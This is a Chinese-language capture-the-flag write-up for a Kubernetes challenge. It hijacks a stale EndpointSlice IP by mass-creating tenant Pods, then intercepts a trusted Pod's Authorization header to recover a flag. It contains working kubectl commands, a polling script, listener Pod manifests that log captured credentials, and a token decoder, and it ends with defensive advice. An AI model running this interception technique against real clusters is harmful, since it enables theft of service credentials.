# NetShare

## 题目简述

题目为每支队伍创建独立的 Kubernetes 集群，并发放 `runtime-operator` 的低权限 kubeconfig。该身份可以：

- 在 `tenant-runtime` 命名空间创建、查看和删除 Pod；
- 只读查看 `customer-platform` 中的 Pod、Service、Endpoints 和 EndpointSlice；
- 不能读取 Secret，也不能修改 `customer-platform` 资源。

真正的目标凭据存放在 `platform-operations/profile-client-credentials`。受信任的 `profile-cache-refresh` Pod 每 10 秒携带该凭据访问：

```text
http://profile-query.customer-platform.svc.cluster.local/v1/cache/refresh/profile-snapshot
```

题目漏洞是手工维护的 EndpointSlice 在后端轮换后仍保留旧 Pod IP 28 秒。若攻击者在这段时间内让自己的 Pod 获得被释放的旧 IP，发往可信 Service 的请求便会被 kube-proxy 转交给攻击者，导致 `Authorization` 请求头泄漏。

决定性障碍是 Kubernetes Service、EndpointSlice、NetworkPolicy 和 CNI IPAM 的组合语义，因此归入 Cloud/Infra。

## 解题过程

### 1. 盘点权限，确认不能直接读取凭据

保存平台给出的 kubeconfig 后先固定上下文：

```bash
export KUBECONFIG="$PWD/runtime-operator.kubeconfig"

kubectl auth can-i create pods -n tenant-runtime
kubectl auth can-i delete pods -n tenant-runtime
kubectl auth can-i get pods/log -n tenant-runtime
kubectl auth can-i get endpointslices.discovery.k8s.io -n customer-platform
kubectl auth can-i get secrets -n platform-operations
```

预期结果是前三类操作允许，最后的 Secret 读取被拒绝。`user.yaml` 还表明，玩家可读取：

```bash
kubectl get pods,svc,endpoints,endpointslices \
  -n customer-platform -o wide
```

所以攻击面不是 RBAC 直接越权，而是利用可观察的服务发现状态与可控的租户 Pod 生命周期。

### 2. 找到没有 selector 的 Service

`profile-query` 的定义只有端口，没有 selector：

```yaml
apiVersion: v1
kind: Service
metadata:
  name: profile-query
  namespace: customer-platform
spec:
  type: ClusterIP
  ports:
    - name: http
      port: 80
      targetPort: 8080
      protocol: TCP
```

因此 Kubernetes 不会根据 Deployment 标签自动维护后端。题目中的 `endpoint-catalog-reconciler` 单独创建名为 `profile-query-registry` 的 EndpointSlice，并设置：

```yaml
metadata:
  labels:
    kubernetes.io/service-name: profile-query
endpoints:
  - addresses:
      - <Pod IP>
    conditions:
      ready: true
ports:
  - port: 8080
```

kube-proxy只关心 EndpointSlice 中的 IP 和端口，并不要求该 IP 当前仍属于同一命名空间、同一标签或原来的 Pod。

### 3. 确认 28 秒的陈旧窗口

控制器循环的关键顺序为：

```sh
IP=$(pod_ip)
set_endpoint "$IP"
sleep 40

POD=$(pod_name)
api -X DELETE \
  "$API/api/v1/namespaces/customer-platform/pods/$POD?gracePeriodSeconds=0"

# EndpointSlice 仍保存旧 IP
sleep 28

# 下一轮才改成新 Pod IP
```

Deployment 会立即补建后端 Pod，但 EndpointSlice 在 28 秒内仍宣告旧地址为 ready。可以同时读取当前后端 IP 和 Slice IP：

```bash
while true; do
  live=$(
    kubectl get pods -n customer-platform \
      -l app.kubernetes.io/name=customer-profile-api \
      -o jsonpath='{.items[0].status.podIP}' 2>/dev/null
  )
  advertised=$(
    kubectl get endpointslice profile-query-registry \
      -n customer-platform \
      -o jsonpath='{.endpoints[0].addresses[0]}' 2>/dev/null
  )

  printf 'live=%s advertised=%s\n' "$live" "$advertised"
  if [ -n "$live" ] && [ -n "$advertised" ] && [ "$live" != "$advertised" ]; then
    stale_ip="$advertised"
    echo "stale window opened: $stale_ip"
    break
  fi
  sleep 1
done
```

`live != advertised` 就表示旧后端已经删除、替代 Pod 已获得新 IP，而 Service 仍指向已释放的旧 IP。

### 4. 为什么攻击者有机会拿到旧 IP

题目集群使用 Calico，并把 IPAM block 缩小为 `/28`。一个 `/28` 只有很小的可用地址集合；集群又只有一个工作节点，`tenant-runtime` 的配额允许最多创建 10 个 Pod。于是攻击者在陈旧窗口中并行创建 Pod，能够快速消耗同一地址块的空闲 IP，其中一个 Pod会获得旧后端刚释放的地址。

准入策略禁止直接使用：

```text
cni.projectcalico.org/ipAddrs
```

指定目标 IP，所以不能精确申请；正确策略是利用小地址池批量占位，并通过 `kubectl get pods -o wide` 检查哪一个 Pod 命中 `stale_ip`。

### 5. 创建满足全部准入条件的监听 Pod

租户 Pod 必须：

- 使用预加载的 `python:3.11-alpine`，且 `imagePullPolicy: Never`；
- 使用 `runtime-operator` ServiceAccount，并关闭 token 自动挂载；
- 只有一个容器；
- 工作目录显式设为 `/`；
- 使用只读根文件系统、禁止提权、丢弃全部 capability；
- 不使用 Secret、ConfigMap、projected volume、探针或交互 TTY。

下面的命令创建 10 个合规的 HTTP 监听 Pod。监听器把完整 `Authorization` 头写到标准输出：

```bash
for i in $(seq 0 9); do
  cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: netshare-capture-$i
  namespace: tenant-runtime
  labels:
    app: netshare-capture
spec:
  serviceAccountName: runtime-operator
  automountServiceAccountToken: false
  restartPolicy: Never
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: listener
      image: python:3.11-alpine
      imagePullPolicy: Never
      workingDir: /
      command:
        - python3
        - -c
      args:
        - |
          from http.server import BaseHTTPRequestHandler, HTTPServer

          class Handler(BaseHTTPRequestHandler):
              def handle_request(self):
                  auth = self.headers.get("Authorization", "")
                  print("AUTH=" + auth, flush=True)
                  body = b"ok\n"
                  self.send_response(200)
                  self.send_header("Content-Length", str(len(body)))
                  self.end_headers()
                  self.wfile.write(body)

              do_GET = handle_request
              do_POST = handle_request

              def log_message(self, *args):
                  pass

          HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
      ports:
        - containerPort: 8080
      resources:
        requests:
          cpu: 10m
          memory: 8Mi
        limits:
          cpu: 100m
          memory: 32Mi
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        capabilities:
          drop:
            - ALL
EOF
done
```

创建后立即查看地址：

```bash
kubectl get pods -n tenant-runtime \
  -l app=netshare-capture -o wide
```

找到 `IP` 等于 `stale_ip` 的 Pod 后，只需查看它的日志；也可以同时跟踪全部监听器：

```bash
kubectl logs -n tenant-runtime \
  -l app=netshare-capture \
  --prefix \
  --max-log-requests=10 \
  -f
```

如果本轮没有命中，应删除这 10 个 Pod，等待下一次 `live != advertised` 后重新创建：

```bash
kubectl delete pods -n tenant-runtime -l app=netshare-capture
```

这是题目范围内租户命名空间的可恢复清理，不需要也不应修改 `customer-platform` 资源。

### 6. NetworkPolicy 为什么没有阻止凭据送达

两个命名空间都启用了默认拒绝。看起来租户 Pod 无法被其他命名空间访问，但 `tenant-runtime` 另有明确放行：

```yaml
ingress:
  - from:
      - namespaceSelector:
          matchLabels:
            kubernetes.io/metadata.name: platform-operations
        podSelector:
          matchLabels:
            app.kubernetes.io/name: profile-cache-refresh
    ports:
      - protocol: TCP
        port: 8080
```

这条规则原本是为了让刷新任务访问目标服务，却选择了 `tenant-runtime` 中的所有 Pod。攻击 Pod获得旧 IP 后，数据包源仍然是合法的 `profile-cache-refresh`，目标端口仍是 8080，因此 NetworkPolicy 主动允许该连接。

这里没有跨命名空间绕过 NetworkPolicy；相反，攻击利用了规则与陈旧服务发现共同形成的错误信任绑定。

### 7. 从服务断言中取出 flag

刷新任务发送：

```sh
curl \
  -H "Authorization: Bearer ${CLIENT_ASSERTION}" \
  http://profile-query.customer-platform.svc.cluster.local/...
```

监听日志中会出现：

```text
AUTH=Bearer svc.v1.<payload>.<signature>
```

该值不是 flag 本身。控制器生成的 payload 包含字段：

```json
{
  "iss": "profile-cache-refresh",
  "aud": "customer-profile-api",
  "scope": "profile.read",
  "tenant": "tenant-runtime",
  "service_proof": "sk-<uuid>"
}
```

断言格式为 `svc.v1.payload.signature`，第三段是无填充 Base64URL。可用以下代码解码：

```python
import base64
import json

authorization = input("Authorization: ").strip()
token = authorization.removeprefix("Bearer ").strip()
parts = token.split(".")
if len(parts) != 4 or parts[:2] != ["svc", "v1"]:
    raise ValueError("unexpected service assertion format")

encoded = parts[2]
encoded += "=" * (-len(encoded) % 4)
payload = json.loads(base64.urlsafe_b64decode(encoded))
print(payload["service_proof"])
```

输出的 `sk-<uuid>` 即该队伍的动态 flag。无需伪造 HMAC，也不应把 Deployment 中的 `FALLBACK_API_KEY` 当成答案；后者只是干扰信息。

## 方法总结

本题的利用链为：

1. 低权限身份只能管理租户 Pod，并只读观察客户服务目录；
2. `profile-query` 没有 selector，完全依赖自定义 EndpointSlice；
3. 控制器删除旧后端后故意延迟 28 秒更新 Slice；
4. Calico `/28` 小地址池让攻击者可用 10 个 Pod快速复用旧 IP；
5. kube-proxy仍把 Service 流量发往旧 IP，不关心该地址已经跨命名空间换了所有者；
6. NetworkPolicy恰好允许受信任刷新 Pod访问所有租户 Pod的 8080 端口；
7. 攻击监听器截获服务断言，解码 `service_proof` 得到动态 flag。

防御上，EndpointSlice 中的裸 IP 不是稳定身份。后端删除时应先将 endpoint 标记为 not ready 或立即移除，再释放 Pod；自定义控制器还应使用 owner/reference 与当前 Pod UID 校验状态。NetworkPolicy也不应把整个租户命名空间作为可信服务的潜在目的地。
